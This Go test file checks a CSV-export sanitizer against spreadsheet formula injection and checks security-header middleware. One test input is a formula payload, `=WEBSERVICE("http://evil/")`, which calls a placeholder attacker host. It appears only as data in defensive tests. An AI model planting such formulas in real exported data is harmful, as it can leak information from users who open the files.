package http

import (
	"net/http"
	"net/http/httptest"
	"testing"

	. "github.com/smartystreets/goconvey/convey"
)

func TestSanitizeCSVCell(t *testing.T) {
	Convey("Given a cell that begins with a formula trigger character", t, func() {
		Convey("Then it is prefixed with a single quote so spreadsheets treat it as text", func() {
			So(sanitizeCSVCell(`=WEBSERVICE("http://evil/")`), ShouldEqual, `'=WEBSERVICE("http://evil/")`)
			So(sanitizeCSVCell("+1+1"), ShouldEqual, "'+1+1")
			So(sanitizeCSVCell("-2"), ShouldEqual, "'-2")
			So(sanitizeCSVCell("@SUM(A1)"), ShouldEqual, "'@SUM(A1)")
			So(sanitizeCSVCell("\tlead-tab"), ShouldEqual, "'\tlead-tab")
			So(sanitizeCSVCell("\rlead-cr"), ShouldEqual, "'\rlead-cr")
		})
	})

	Convey("Given an ordinary cell", t, func() {
		Convey("Then it is returned unchanged", func() {
			So(sanitizeCSVCell(""), ShouldEqual, "")
			So(sanitizeCSVCell("hello"), ShouldEqual, "hello")
			So(sanitizeCSVCell("123"), ShouldEqual, "123")
			So(sanitizeCSVCell("a=b"), ShouldEqual, "a=b")
		})
	})

	Convey("Given a row", t, func() {
		row := []string{"ok", "=bad", "-also"}
		Convey("Then every triggering cell is neutralised in place", func() {
			out := sanitizeCSVRow(row)
			So(out, ShouldResemble, []string{"ok", "'=bad", "'-also"})
		})
	})
}

func TestSecurityHeaders(t *testing.T) {
	Convey("Given the security-headers middleware wrapping a handler", t, func() {
		h := securityHeaders(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
			w.WriteHeader(http.StatusOK)
		}))
		rec := httptest.NewRecorder()
		h.ServeHTTP(rec, httptest.NewRequest("GET", "/", nil))

		Convey("Then defensive headers are present on the response", func() {
			So(rec.Header().Get("X-Content-Type-Options"), ShouldEqual, "nosniff")
			So(rec.Header().Get("X-Frame-Options"), ShouldEqual, "DENY")
			So(rec.Header().Get("Referrer-Policy"), ShouldEqual, "no-referrer")
			So(rec.Header().Get("Content-Security-Policy"), ShouldContainSubstring, "default-src 'self'")
			So(rec.Header().Get("Content-Security-Policy"), ShouldContainSubstring, "frame-ancestors 'none'")
		})
	})
}
